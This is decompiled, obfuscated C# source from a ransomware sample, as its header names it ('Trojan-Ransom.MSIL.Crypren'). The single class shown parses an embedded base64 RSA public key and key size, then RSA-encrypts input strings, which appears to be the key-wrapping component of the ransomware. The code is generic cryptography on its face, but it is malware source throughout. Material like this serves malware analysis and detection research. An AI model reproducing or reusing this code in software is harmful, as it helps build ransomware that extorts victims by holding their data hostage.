// Decompiled with JetBrains decompiler
// Type: InTDhhOfzy.BAWbbIGcEbbh
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0602F1A4-2566-46B4-A0A6-6E0F94D14C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-899f48bad035165acf8869af63922619f8a901bbeb8a7fc13919ba90dd9e7768.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace InTDhhOfzy
{
  public static class BAWbbIGcEbbh
  {
    private static bool WqKFAfaHUUc;
    private static readonly string pGRhuApHKDGfXW;
    [NonSerialized]
    internal static GetString \u0089;

    public static string BsLVCxQmQh([In] string obj0)
    {
      int PuvQplKsoPqGP = 0;
      string FFrdLKHmvbtik = BAWbbIGcEbbh.\u0089(107395197);
      BAWbbIGcEbbh.RzbONKbukBgtSS(BAWbbIGcEbbh.pGRhuApHKDGfXW, out PuvQplKsoPqGP, out FFrdLKHmvbtik);
      return Convert.ToBase64String(BAWbbIGcEbbh.eNVqHuScKJGA(Encoding.UTF8.GetBytes(obj0), PuvQplKsoPqGP, FFrdLKHmvbtik));
    }

    private static byte[] eNVqHuScKJGA([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(BAWbbIGcEbbh.\u0089(107409104), BAWbbIGcEbbh.\u0089(107409051));
      int num = BAWbbIGcEbbh.swfIUmFPbhSD(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(BAWbbIGcEbbh.\u0089(107409074), (object) num), BAWbbIGcEbbh.\u0089(107409051));
      if (!BAWbbIGcEbbh.VkulywvKImJoU(obj1))
        throw new ArgumentException(BAWbbIGcEbbh.\u0089(107409549), BAWbbIGcEbbh.\u0089(107409520));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(BAWbbIGcEbbh.\u0089(107409507), BAWbbIGcEbbh.\u0089(107409478));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, BAWbbIGcEbbh.WqKFAfaHUUc);
      }
    }

    private static int swfIUmFPbhSD([In] int obj0) => BAWbbIGcEbbh.WqKFAfaHUUc ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool VkulywvKImJoU([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void RzbONKbukBgtSS(
      string LKXoFFZofzqpUN,
      out int PuvQplKsoPqGP,
      out string FFrdLKHmvbtik)
    {
      PuvQplKsoPqGP = 0;
      FFrdLKHmvbtik = BAWbbIGcEbbh.\u0089(107395197);
      if (LKXoFFZofzqpUN == null || LKXoFFZofzqpUN.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(LKXoFFZofzqpUN));
      if (!str.Contains(BAWbbIGcEbbh.\u0089(107409429)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        PuvQplKsoPqGP = int.Parse(strArray[0]);
        FFrdLKHmvbtik = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static BAWbbIGcEbbh()
    {
      Strings.CreateGetStringDelegate(typeof (BAWbbIGcEbbh));
      BAWbbIGcEbbh.WqKFAfaHUUc = false;
      BAWbbIGcEbbh.pGRhuApHKDGfXW = BAWbbIGcEbbh.\u0089(107409456);
    }
  }
}
